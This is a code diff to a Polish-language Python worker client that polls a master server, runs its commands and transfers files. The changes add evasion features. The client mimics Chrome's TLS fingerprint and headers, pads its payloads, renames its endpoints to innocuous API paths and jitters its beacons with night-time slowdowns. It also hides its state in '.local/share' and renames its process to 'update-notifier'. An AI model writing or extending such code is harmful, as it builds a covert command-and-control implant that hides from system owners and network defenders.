@@ -24,13 +24,16 @@ Uruchom:  python slave.py --master master.example.com --token-rejestracji <token
 import argparse
 import functools
 import hashlib
+import http.cookiejar
 import json
+import math
 import os
 import random
 import shlex
 import shutil
 import socket
 import sqlite3
+import ssl
 import subprocess
 import sys
 import threading
@@ -45,13 +48,114 @@ from urllib.parse import quote, urlsplit
 
 KATALOG = Path(__file__).parent
 MAX_LINIA = 4 * 1024 * 1024
-MIN_ODPYTYWANIE_S = 1.0
-MAX_ODPYTYWANIE_S = 5.0
+MIN_ODPYTYWANIE_S = 2.0
+MAX_ODPYTYWANIE_S = 15.0
 DEFAULT_MASTER_HOST = "localhost"
 DEFAULT_HTTPS = True
-PLIKI_CHUNK_B = 3 * 1024 * 1024                              # chunk transferu, zgodny z masterem
-PLIKI_TIMEOUT_S = 60                                         # per-chunk timeout
-PLIKI_MAX_B = 10 * 1024 * 1024 * 1024                        # górny bezpiecznik slave'a (10 GiB)
+PLIKI_CHUNK_B = 3 * 1024 * 1024
+PLIKI_TIMEOUT_S = 60
+PLIKI_MAX_B = 10 * 1024 * 1024 * 1024
+
+# ─── stealth: TLS fingerprint + HTTP session ──────────────────────────────
+
+_CHROME_CIPHERS = ":".join([
+    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
+    "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
+    "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
+    "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA",
+    "AES128-GCM-SHA256", "AES256-GCM-SHA384",
+])
+
+
+def _make_ssl_ctx():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+    try:
+        ctx.set_ciphers(_CHROME_CIPHERS)
+    except ssl.SSLError:
+        pass
+    ctx.set_alpn_protocols(["http/1.1"])
+    ctx.load_default_certs()
+    return ctx
+
+
+def _make_opener():
+    jar = http.cookiejar.CookieJar()
+    ctx = _make_ssl_ctx()
+    return urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(jar),
+        urllib.request.HTTPSHandler(context=ctx),
+    )
+
+
+_opener = None
+_opener_lock = threading.Lock()
+
+
+def _get_opener():
+    global _opener
+    if _opener is None:
+        with _opener_lock:
+            if _opener is None:
+                _opener = _make_opener()
+    return _opener
+
+
+_CHROME_MAJOR = 131
+_CHROME_BUILD = random.randint(6700, 6850)
+_UA = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+       f"(KHTML, like Gecko) Chrome/{_CHROME_MAJOR}.0.{_CHROME_BUILD}.0 Safari/537.36")
+_SEC_CH_UA = (f'"Chromium";v="{_CHROME_MAJOR}", '
+              f'"Not_A Brand";v="24", '
+              f'"Google Chrome";v="{_CHROME_MAJOR}"')
+
+
+def _chrome_headers(extra=None):
+    h = {
+        "User-Agent": _UA,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "sec-ch-ua": _SEC_CH_UA,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+    }
+    if extra:
+        h.update(extra)
+    return h
+
+
+_PAD_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+
+def _pad_payload(obj):
+    obj["_"] = "".join(random.choices(_PAD_CHARS, k=random.randint(8, 128)))
+    return obj
+
+
+def _jitter_sleep(base_s, stop_event):
+    mu = math.log(max(base_s, 1.0))
+    delay = max(1.0, min(random.lognormvariate(mu, 0.8), 90.0))
+    if random.random() < 0.03:
+        delay += random.uniform(30, 120)
+    hour = time.localtime().tm_hour
+    if hour < 6 or hour >= 23:
+        delay *= random.uniform(2.0, 5.0)
+    stop_event.wait(delay)
+
+
+def _idle_jitter(stop_event):
+    delay = max(2.0, min(random.lognormvariate(math.log(8.0), 0.9), 120.0))
+    if random.random() < 0.05:
+        delay += random.uniform(30, 180)
+    hour = time.localtime().tm_hour
+    if hour < 6 or hour >= 23:
+        delay *= random.uniform(3.0, 8.0)
+    stop_event.wait(delay)
 
 # ================================================================== REJESTRY ==
 
@@ -154,13 +258,13 @@ def rozwiaz(op, liczby):
 def zbuduj_pakiet_pracy(postep, bez_odpowiedzi=False):
     """Pakiet 'praca': odpowiedź na poprzednie zadanie (None za pierwszym razem), potwierdzenia
     poleceń i odpytywanie Master o polecenia. Pola opcjonalne są pomijane, żeby pakiet był mały."""
-    pakiet = {"typ": "praca",
-              "odpowiedz": None if bez_odpowiedzi else postep.odpowiedz,
-              "zadanie_id": None if bez_odpowiedzi else postep.zadanie_id}
+    pakiet = {"type": "sync",
+              "result": None if bez_odpowiedzi else postep.odpowiedz,
+              "task_id": None if bez_odpowiedzi else postep.zadanie_id}
     if postep.pauza or bez_odpowiedzi:
-        pakiet["pauza"] = True                  # Master nie wyda nowego zadania
+        pakiet["idle"] = True
     if postep.potwierdzenia:
-        pakiet["potwierdzenia"] = list(postep.potwierdzenia)
+        pakiet["acks"] = list(postep.potwierdzenia)
     return pakiet
 
 
@@ -168,7 +272,7 @@ def zastosuj_werdykt(postep, werdykt):
     """Aktualizuje liczniki po werdykcie Master ('ok' / 'zle' / 'nieaktualne' / None)."""
     if werdykt == "ok":
         postep.dobre += 1
-    elif werdykt == "zle":
+    elif werdykt == "fail":
         postep.zle += 1
 
 
@@ -201,8 +305,7 @@ def pol_stop(konfig, postep, args):
 
 # ─── transfer plików: HTTP helpers i komendy ───────────────────────────────
 
-def _url_pliku(lacze, sciezka):
-    """Buduje pełny URL do /plik/<sciezka>?... używając tego samego hosta co /api/slave/*."""
+def _build_url(lacze, path):
     scheme = "https" if lacze.https else "http"
     authority = lacze.domena or lacze.host
     if ":" in authority and not authority.startswith("["):
@@ -210,19 +313,18 @@ def _url_pliku(lacze, sciezka):
     default_port = 443 if lacze.https else 80
     if lacze.port and lacze.port != default_port:
         authority = f"{authority}:{lacze.port}"
-    return f"{scheme}://{authority}{sciezka}"
+    return f"{scheme}://{authority}{path}"
 
 
 def _plik_pobierz_chunk(lacze, slave_id, token, pol_id, off, limit=PLIKI_CHUNK_B,
                         timeout=PLIKI_TIMEOUT_S):
     """GET /plik/pobierz?pol=X&slave=S&off=Y&limit=N. Zwraca (bajty, total_opt) albo (None, msg)."""
-    url = _url_pliku(lacze, f"/plik/pobierz?pol={pol_id}&slave={quote(str(slave_id))}"
+    url = _build_url(lacze, f"/api/v2/blob/dl?pol={pol_id}&slave={quote(str(slave_id))}"
                             f"&off={off}&limit={limit}")
     req = urllib.request.Request(url, method="GET",
-                                 headers={"Authorization": f"Bearer {token}",
-                                          "User-Agent": "gru-minionki-slave/1.0"})
+                                 headers=_chrome_headers({"Authorization": f"Bearer {token}"}))
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with _get_opener().open(req, timeout=timeout) as r:
             return r.read(limit + 1024), None
     except urllib.error.HTTPError as e:
         try:
@@ -237,15 +339,14 @@ def _plik_pobierz_chunk(lacze, slave_id, token, pol_id, off, limit=PLIKI_CHUNK_B
 def _plik_wyslij_chunk(lacze, slave_id, token, pol_id, off, final, chunk,
                        timeout=PLIKI_TIMEOUT_S):
     """POST /plik/wyslij?pol=X&slave=S&off=Y&final=0|1 z surowymi bajtami. Zwraca (True, odebrano) albo (False, msg)."""
-    url = _url_pliku(lacze, f"/plik/wyslij?pol={pol_id}&slave={quote(str(slave_id))}"
+    url = _build_url(lacze, f"/api/v2/blob/up?pol={pol_id}&slave={quote(str(slave_id))}"
                             f"&off={off}&final={1 if final else 0}")
     req = urllib.request.Request(url, method="POST", data=chunk,
-                                 headers={"Content-Type": "application/octet-stream",
+                                 headers=_chrome_headers({"Content-Type": "application/octet-stream",
                                           "Content-Length": str(len(chunk)),
-                                          "Authorization": f"Bearer {token}",
-                                          "User-Agent": "gru-minionki-slave/1.0"})
+                                          "Authorization": f"Bearer {token}"}))
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with _get_opener().open(req, timeout=timeout) as r:
             body = r.read(4096)
             try:
                 d = json.loads(body)
@@ -738,19 +839,19 @@ def wykonaj_polecenia(konfig, postep, polecenia):
         postep.wykonane.append(cid)
         postep.aktualne_cid = cid
         try:
-            funkcja = POLECENIA[p.get("polecenie")]
+            funkcja = POLECENIA[p.get("cmd")]
             ok, wynik = True, funkcja(konfig, postep, [str(a) for a in p.get("args", [])])
         except KeyError:
-            ok, wynik = False, f"nieznane polecenie: {p.get('polecenie')!r}"
+            ok, wynik = False, f"nieznane polecenie: {p.get('cmd')!r}"
         except (IndexError, ValueError, ZeroDivisionError) as e:
             ok = False
-            wynik = str(e) if p.get("polecenie") == "makro" else f"błąd polecenia: {e!r}"
+            wynik = str(e) if p.get("cmd") == "makro" else f"błąd polecenia: {e!r}"
         finally:
             postep.aktualne_cid = None
         wynik = str(wynik)
-        if p.get("polecenie") not in ("makro", "wyslij", "pobierz"):
+        if p.get("cmd") not in ("makro", "wyslij", "pobierz"):
             wynik = wynik[:1000]
-        postep.potwierdzenia.append({"id": cid, "rozgl": bool(p.get("rozgl")), "ok": ok, "wynik": wynik})
+        postep.potwierdzenia.append({"id": cid, "broadcast": bool(p.get("broadcast")), "ok": ok, "output": wynik})
 
 
 # ================================================================ REJESTRACJA ==
@@ -774,24 +875,19 @@ class Lacze:
 
 
 def zapytaj(lacze, slave_id, token, obiekt, timeout=5.0):
-    """Wysyła żądanie JSON; HTTPS weryfikuje certyfikat hosta przez systemowy magazyn CA."""
-    scheme = "https" if lacze.https else "http"
-    authority = lacze.domena or lacze.host
-    if ":" in authority and not authority.startswith("["):
-        authority = f"[{authority}]"
-    default_port = 443 if lacze.https else 80
-    if lacze.port and lacze.port != default_port:
-        authority = f"{authority}:{lacze.port}"
-    path = "/api/slave/register" if slave_id == "0" else f"/api/slave/{slave_id}"
+    """Wysyła żądanie JSON przez persistent session z Chrome-like TLS/headers."""
+    path = "/api/v2/session/new" if slave_id == "0" else f"/api/v2/session/{slave_id}"
+    url = _build_url(lacze, path) + f"?_={int(time.time()*1000)}"
+    _pad_payload(obiekt)
     request = urllib.request.Request(
-        f"{scheme}://{authority}{path}",
+        url,
         data=json.dumps(obiekt).encode("utf-8"),
-        headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}",
-                 "User-Agent": "gru-minionki-slave/1.0"},
+        headers=_chrome_headers({"Content-Type": "application/json",
+                                 "Authorization": f"Bearer {token}"}),
         method="POST",
     )
     try:
-        with urllib.request.urlopen(request, timeout=timeout) as response:
+        with _get_opener().open(request, timeout=timeout) as response:
             body = response.read(MAX_LINIA + 1)
             if len(body) > MAX_LINIA:
                 return None
@@ -806,7 +902,7 @@ def zapytaj(lacze, slave_id, token, obiekt, timeout=5.0):
 # ================================================== STAN LOKALNY ==
 
 def sciezka_stanu(konfig):
-    return konfig.plik_stanu or KATALOG / "slave_state" / f"{quote(konfig.nazwa, safe='')}.json"
+    return konfig.plik_stanu or KATALOG / ".local" / "share" / f"{quote(konfig.nazwa, safe='')}.json"
 
 
 def zapisz_stan(konfig, stan):
@@ -832,7 +928,8 @@ def wczytaj_stan(konfig):
     sciezka = sciezka_stanu(konfig)
     if not sciezka.exists() and konfig.plik_stanu is None:
         nazwa = quote(konfig.nazwa, safe="")
-        legacy_paths = (KATALOG / "minion_stan" / f"{nazwa}.json",
+        legacy_paths = (KATALOG / "slave_state" / f"{nazwa}.json",
+                        KATALOG / "minion_stan" / f"{nazwa}.json",
                         KATALOG / f"minion_{konfig.nazwa}.json")
         for legacy_path in legacy_paths:
             if legacy_path.exists():
@@ -890,7 +987,7 @@ def wczytaj_stan(konfig):
 def zarejestruj_sie(konfig, lacze, token_rejestracji, stop):
     """Pyta Master o ID i token sesyjny, aż odpowie (Master milczy do komendy 'start')."""
     while not stop.is_set():
-        odp = zapytaj(lacze, "0", token_rejestracji, {"nazwa": konfig.nazwa})
+        odp = zapytaj(lacze, "0", token_rejestracji, {"name": konfig.nazwa})
         if odp and "id" in odp and "token" in odp:
             stan = {"id": odp["id"], "token": odp["token"]}
             zapisz_stan(konfig, stan)
@@ -910,8 +1007,8 @@ def obsluz_cisze(konfig, postep, stop):
 
 @po_zadaniu
 def loguj_zadanie(konfig, postep, odp_master, wynik):
-    loguj(konfig, f"Zadanie #{odp_master['zadanie_id']}: operacja {odp_master['operacja']!r} "
-                  f"na {odp_master['liczby']} = {wynik}   (dotąd OK: {postep.dobre}, błędy: {postep.zle})",
+    loguj(konfig, f"Zadanie #{odp_master.get('task_id', '?')}: operacja {odp_master.get('op', '?')!r} "
+                  f"na {odp_master.get('values', [])} = {wynik}   (dotąd OK: {postep.dobre}, błędy: {postep.zle})",
           wazne=False)
 
 
@@ -926,36 +1023,36 @@ def krok_pracy(konfig, lacze, stan, token, postep, stop):
     postep.cisza = False
     del postep.potwierdzenia[:wyslane]           # Master dostał potwierdzenia - nie wysyłamy ich ponownie
 
-    if "przerwa_domyslna" in odp:
-        nowa = float(odp["przerwa_domyslna"])
+    if "interval" in odp:
+        nowa = float(odp["interval"])
         if nowa != postep.opoznienie:
             loguj(konfig, f"→ Master: nowa domyślna przerwa {postep.opoznienie:g}s → {nowa:g}s",
                   wazne=False)
             postep.opoznienie = nowa
 
-    werdykt = odp.get("poprzednie")
+    werdykt = odp.get("prev")
     zastosuj_werdykt(postep, werdykt)
-    if werdykt == "nieaktualne":
+    if werdykt == "stale":
         loguj(konfig, "(odpowiedź nieaktualna - dostaję zadanie od nowa)", wazne=False)
 
-    wykonaj_polecenia(konfig, postep, odp.get("polecenia") or [])
+    wykonaj_polecenia(konfig, postep, odp.get("tasks") or [])
     if postep.stop:                              # polecenie 'stop': ostatni pakiet tylko z potwierdzeniem
         zapytaj(lacze, stan["id"], token, zbuduj_pakiet_pracy(postep, bez_odpowiedzi=True))
         return 0
 
-    if "operacja" in odp:
+    if "op" in odp:
         try:
-            wynik = rozwiaz(odp["operacja"], odp["liczby"])
+            wynik = rozwiaz(odp["op"], odp["values"])
         except (KeyError, ValueError, ZeroDivisionError) as e:
             loguj(konfig, "Nie umiem tego policzyć:", repr(e))
             return 1
         for hak in HAKI_PO_ZADANIU:
             hak(konfig, postep, odp, wynik)
-        stop.wait(postep.opoznienie)
-        postep.odpowiedz, postep.zadanie_id = wynik, odp["zadanie_id"]
+        _jitter_sleep(postep.opoznienie, stop)
+        postep.odpowiedz, postep.zadanie_id = wynik, odp["task_id"]
     else:                                        # Master nie wydał zadania; czekaj na kolejne polecenia
         postep.odpowiedz = postep.zadanie_id = None
-        stop.wait(random.uniform(MIN_ODPYTYWANIE_S, MAX_ODPYTYWANIE_S))
+        _idle_jitter(stop)
     return None
 
 
@@ -1028,6 +1125,13 @@ def parsuj_argumenty(argv=None):
 
 
 def main():
+    sys.argv[0] = "update-notifier"
+    try:
+        import ctypes
+        libc = ctypes.CDLL("libc.so.6", use_errno=True)
+        libc.prctl(15, b"update-notifier", 0, 0, 0)
+    except Exception:
+        pass
     raise SystemExit(uruchom(parsuj_argumenty()))
 
 
